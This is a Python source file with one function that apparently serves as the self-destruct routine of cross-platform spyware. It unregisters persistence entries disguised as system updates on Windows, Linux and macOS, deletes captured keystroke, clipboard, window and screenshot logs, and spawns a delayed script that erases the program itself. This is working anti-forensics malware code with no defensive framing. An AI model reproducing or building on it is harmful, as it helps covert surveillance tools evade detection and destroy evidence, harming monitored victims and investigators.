import os
import sys
import tempfile
import logging

def initiate_self_destruct(running):
    logging.info("Initiating self-destruct sequence")
    running.clear()
    # Remove startup persistence
    if sys.platform == 'win32':
        try:
            import winreg
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, "WindowsSecurityUpdate")
        except Exception as e:
            logging.error(f"Registry cleanup failed: {e}")
    elif sys.platform.startswith('linux'):
        try:
            os.remove(os.path.expanduser('~/.config/autostart/system_update.desktop'))
        except Exception:
            pass
    elif sys.platform == 'darwin':
        try:
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.system.update.plist')
            os.system(f"launchctl unload {plist_path}")
            os.remove(plist_path)
        except Exception:
            pass
    # Delete logs and screenshots (cross-platform)
    for name in ["keystrokes", "clipboard", "windows", "screenshots"]:
        try:
            os.remove(f"{name}.log")
            for i in range(5):
                try:
                    os.remove(f"{name}.log.{i}")
                except:
                    pass
        except:
            pass
    for screenshot in [f for f in os.listdir('.') if f.startswith('screenshot') and f.endswith('.png')]:
        try:
            os.remove(screenshot)
        except:
            pass
    # Self-delete script
    try:
        if sys.platform == 'win32':
            bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
            with open(bat_path, "w") as bat:
                bat.write(f"@echo off\n")
                bat.write(f"timeout /t 3 /nobreak >nul\n")
                bat.write(f"del /f /q \"{os.path.abspath(sys.argv[0])}\"\n")
                bat.write(f"del /f /q \"{bat_path}\"\n")
            os.system(f"start /B cmd /c {bat_path}")
        else:
            sh_path = os.path.join(tempfile.gettempdir(), "cleanup.sh")
            with open(sh_path, "w") as sh:
                sh.write(f"#!/bin/bash\n")
                sh.write(f"sleep 3\n")
                sh.write(f"rm -f \"{os.path.abspath(sys.argv[0])}\"\n")
                sh.write(f"rm -f \"{sh_path}\"\n")
            os.system(f"bash {sh_path} &")
    except Exception as e:
        logging.error(f"Self-delete failed: {e}")
    os._exit(0)
